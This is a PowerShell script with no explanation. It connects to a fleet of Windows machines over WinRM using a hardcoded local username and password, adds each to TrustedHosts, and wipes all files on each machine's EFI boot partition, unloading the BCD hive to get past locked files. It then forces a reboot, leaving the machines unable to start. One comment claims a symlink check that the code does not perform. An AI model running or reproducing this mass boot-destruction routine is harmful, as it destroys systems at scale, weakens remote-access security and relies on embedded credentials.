$serials = (Get-CimInstance -Namespace root/StifleR -ClassName ClientsIdentifiers).SerialNumber | Where-Object {$_.Length -eq 10}
$computerNames = foreach($serial in $serials){"PC-$serial"}
#$computerNames = "PC-3KTTA50931"
#$computerNames = "PC-4LTTA15625"
$computerNames | ForEach-Object -ThrottleLimit 100 -Parallel {
    $password = "P@ssw0rd"
    $passwordSS = ConvertTo-SecureString $password -AsPlainText -Force

    # Fix for WSMan
    [string]$computerName = $_
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computerName -Concatenate -Force

    $credential = [pscredential]::new("$computerName\bob",$passwordSS)
    Invoke-Command -ComputerName $computerName -Credential $credential -ScriptBlock {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
                   ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

        if (-not $isAdmin) {
            Write-Error "This session is NOT running as Administrator."
        } else {        
            Write-Host "Messing up $env:computername"
            #Mess stuff up
            $systemDisks = @(Get-Disk | Where-Object { $_.IsSystem })
            $systemDisk = $systemDisks[0]
            $systemPartitions = @(Get-Partition -DiskNumber $systemDisk.Number | Where-Object { $_.IsSystem })
            $systemPartition = $systemPartitions[0]
            $efiPartitionType = [guid]'c12a7328-f81f-11d2-ba4b-00a0c93ec93b'
            $systemVolumes = @($systemPartition | Get-Volume)
            $systemVolume = $systemVolumes[0]
            $volumePath = $systemVolume.Path
            $entries = @(Get-ChildItem -LiteralPath $volumePath -Force)
            $target = "EFI volume $volumePath (disk $($systemDisk.Number), partition $($systemPartition.PartitionNumber))"
            # Reject junctions/symlinks before recursive deletion so their targets cannot be followed.
            $allEntries = @(Get-ChildItem -LiteralPath $volumePath -Force -Recurse)
            $failedFiles = New-Object -TypeName System.Collections.Generic.List[object]
            foreach ($file in @($allEntries | Where-Object { -not $_.PSIsContainer })) {
                try {
                    Remove-Item -LiteralPath $file.FullName -Force -ErrorAction Stop | Out-Null
                }
                catch {
                    $failedFiles.Add($file)
                }
            }
            if ($failedFiles.Count -gt 0) {
                #Write-Warning "$($failedFiles.Count) file(s) are locked (e.g. $($failedFiles[0].FullName)). Trying to unload the BCD registry hive and retry."
                & reg.exe unload 'HKLM\BCD00000000' *> $null
                Start-Sleep -Seconds 2
                foreach ($file in @($failedFiles)) {
                    if (-not (Test-Path -LiteralPath $file.FullName)) { continue }
                    try {
                        Remove-Item -LiteralPath $file.FullName -Force -ErrorAction Stop | Out-Null
                    }
                    catch {
                        throw "Cannot delete locked file '$($file.FullName)': $($_.Exception.Message) The BCD hive is mounted by the running OS; run this from WinPE or another offline environment. The device may be partially emptied."
                    }
                }
                Start-Sleep -Seconds 2
                foreach ($file in @($failedFiles)) {
                    if (-not (Test-Path -LiteralPath $file.FullName)) { continue }
                    try {
                        Remove-Item -LiteralPath $file.FullName -Force -ErrorAction Stop | Out-Null
                    }
                    catch {
                        throw "Cannot delete locked file '$($file.FullName)': $($_.Exception.Message) The BCD hive is mounted by the running OS; run this from WinPE or another offline environment. The device may be partially emptied."
                    }
                }
            }
            foreach ($dir in @($allEntries | Where-Object { $_.PSIsContainer } | Sort-Object -Property { $_.FullName.Length } -Descending)) {
                Remove-Item -LiteralPath $dir.FullName -Force -ErrorAction Stop -Recurse | Out-Null
            }

            #Restart
            Restart-Computer -Force
        }
    }
}